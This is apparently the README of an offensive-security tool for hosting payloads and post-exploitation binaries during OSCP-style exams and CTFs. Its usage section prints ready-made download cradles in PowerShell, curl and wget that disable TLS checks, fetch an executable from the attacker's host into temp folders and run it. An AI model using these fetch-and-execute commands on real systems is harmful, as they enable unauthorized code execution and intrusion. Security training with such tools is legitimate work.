<h1 align="center">
    <img src="img/quick_drop_small.png"></img>

![Python](https://img.shields.io/badge/python-3670A0?style=for-the-badge&logo=python&logoColor=ffdd54)
![Flask](https://img.shields.io/badge/flask-%23000.svg?style=for-the-badge&logo=flask&logoColor=white)
![Visual Studio Code](https://img.shields.io/badge/Visual%20Studio%20Code-0078d7.svg?style=for-the-badge&logo=visual-studio-code&logoColor=white)
![Prettier](https://img.shields.io/badge/prettier-1A2C34?style=for-the-badge&logo=prettier&logoColor=F7BA3E)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg?style=for-the-badge)](https://opensource.org/licenses/MIT)


</h1>

## About
Rapidly host payloads and post-exploitation bins over HTTP or HTTPS. 

Designed to be used on exams like OSCP / PNPT or CTFs HTB / etc.

Pull requests and issues welcome. As are any contributions.

Qu1ckdr0p2 comes with an alias and search feature. The tools are located in the <a href ="https://github.com/byinarie/qu1ckdr0p2-tools">qu1ckdr0p2-tools</a> repository. By default it will generate a self-signed certificate to use when using the `--https` option, priority is also given to the `tun0` interface when the webserver is running, otherwise it will use `eth0`.

The <a href="https://github.com/byinarie/qu1ckdr0p2-tools/blob/main/config/common.ini">common.ini</a> defines the mapped aliases used within the `--search and -u` options.

When the webserver is running there are several download cradles printed to the screen to copy and paste.

## Install
#### Using pip is the only supported way of installing
#### Cloning this repository to install will probably break something
```zsh
pip3 install qu1ckdr0p2
serv init --update
```
#### Export as an alias if needed
```
echo "alias serv='~/.local/bin/serv'" >> ~/.zshrc
source ~/.zshrc
```

```
echo "alias serv='~/.local/bin/serv'" >> ~/.bashrc
source ~/.bashrc
```

## Usage
### Serv a single file located in your current working directory
```zsh
serv serve -f implant.bin --https 443
```
```zsh
serv serve -f file.example --http 8080
```

## Update and help
```zsh
  serv --help            
Usage: serv [OPTIONS] COMMAND [ARGS]...

  Welcome to qu1ckdr0p2 entry point.

Options:
  --debug  Enable debug mode.
  --help   Show this message and exit.

Commands:
  init   Perform updates.
  serve  Serve files.
```
```zsh
  serv serve --help
Usage: serv serve [OPTIONS]

  Serve files.

Options:
  -l, --list         List aliases
  -s, --search TEXT  Search query for aliases
  -u, --use INTEGER  Use an alias by a dynamic number
  -f, --file FILE    Serve a file
  --http INTEGER     Use HTTP with a custom port
  --https INTEGER    Use HTTPS with a custom port
  -h, --help         Show this message and exit.
```
```zsh
  serv init --help       
Usage: serv init [OPTIONS]

  Perform updates.

Options:
  --update            Check and download missing tools.
  --update-self       Update the tool using pip.
  --update-self-test  Used for dev testing, installs unstable build.
  --help              Show this message and exit.
```

```zsh
serv init --update
```
```zsh
serv init --update-self
```
### Serv a file from a mapped alias
The mapped alias numbers for the `-u` option are dynamic so you don't have to remember specific numbers or ever type out a tool name.
```zsh
$ serv serve --search seatbelt
[→] Path: ~/.qu1ckdr0p2/windows/Seatbelt.exe
[→] Alias: seatbelt
[→] Use: 1

[→] Path: ~/.qu1ckdr0p2/windows/NetFramework_4.0_Any/Seatbelt.exe
[→] Alias: seatbelt_net40_any
[→] Use: 2

[→] Path: ~/.qu1ckdr0p2/windows/NetFramework_4.0_x64/Seatbelt.exe
[→] Alias: seatbelt_net40_x64
[→] Use: 3

[→] Path: ~/.qu1ckdr0p2/windows/NetFramework_4.0_x86/Seatbelt.exe
[→] Alias: seatbelt_net40_x86
[→] Use: 4

(...)

$ serv serve --search seatbelt -u 2
[→] Serving: ../../../.qu1ckdr0p2/windows/NetFramework_4.0_Any/Seatbelt.exe
[→] Protocol: https
[→] IP address: 192.168.1.5
[→] Port: 443
[→] Interface: eth0
[→] Using cert: /home/byinarie/.qu1ckdr0p2/certs/cert.pem
[→] Using key: /home/byinarie/.qu1ckdr0p2/certs/key.pem
[→] CTRL+C to quit

[→] URL: https://192.168.1.5:443/Seatbelt.exe

[↓] csharp_ignore_tls:
Add-Type -TypeDefinition "using System.Net;using System.Security.Cryptography.X509Certificates;public class SSLValidator {public static void Ignore() {ServicePointManager.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true;}}" -Language CSharp; [SSLValidator]::Ignore(); $webclient = New-Object System.Net.WebClient; $webclient.DownloadFile('https://192.168.1.5:443/Seatbelt.exe', 'c:\windows\temp\Seatbelt.exe');Start-Process 'c:\windows\temp\Seatbelt.exe'

[↓] wget_ignore_tls:
wget --no-check-certificate https://192.168.1.5:443/Seatbelt.exe -O /tmp/Seatbelt.exe && chmod +x /tmp/Seatbelt.exe && /tmp/Seatbelt.exe

[↓] curl_ignore_tls:
curl -k https://192.168.1.5:443/Seatbelt.exe -o /tmp/Seatbelt.exe && chmod +x /tmp/Seatbelt.exe && /tmp/Seatbelt.exe

[↓] powershell_ignore_tls:
$AllProtocols = [System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12'; [System.Net.ServicePointManager]::SecurityProtocol = $AllProtocols; $WebClient = New-Object System.Net.WebClient; $WebClient.DownloadFile('https://192.168.1.5:443/Seatbelt.exe', 'c:\windows\temp\Seatbelt.exe'); Start-Process 'c:\windows\temp\Seatbelt.exe'
```




## License

MIT

---

